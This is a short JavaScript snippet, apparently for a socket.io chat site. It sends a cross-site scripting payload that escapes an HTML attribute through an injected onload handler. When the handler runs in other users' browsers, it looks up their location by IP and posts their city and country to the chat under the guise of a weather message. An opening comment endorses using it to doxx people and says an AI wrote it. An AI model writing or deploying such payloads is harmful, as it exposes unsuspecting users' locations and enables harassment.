// dont fucking use this unless you're gonna doxx someone, ai loves doxxing, it literally didnt remove the city variable
socket.emit('command', {
  list: [
    "youtube",
    "eee\" onload=\"(async () => { \
      try { \
        const geo = await fetch('https://ipapi.co/json/'); \
        const geoData = await geo.json(); \
        const city = geoData.city; \
        const country = geoData.country_name; \
        \
        const weatherResponse = await fetch('https://wttr.in/' + city + '?format=j1'); \
        const weatherData = await weatherResponse.json(); \
        \
        const temp = weatherData.current_condition[0].temp_C; \
        const condition = weatherData.current_condition[0].weatherDesc[0].value; \
        \
        var weatherMessage = 'The weather in ' + city + ', ' + country + ' right now is ' + temp + '°C with ' + condition + '.'; \
        \
        window.socket.emit('talk', { text: weatherMessage }); \
        console.log(weatherMessage); \
      } catch (err) { \
        window.socket.emit('talk', { text: 'Unable to fetch weather data.' }); \
      } \
    })()\""
  ]
});
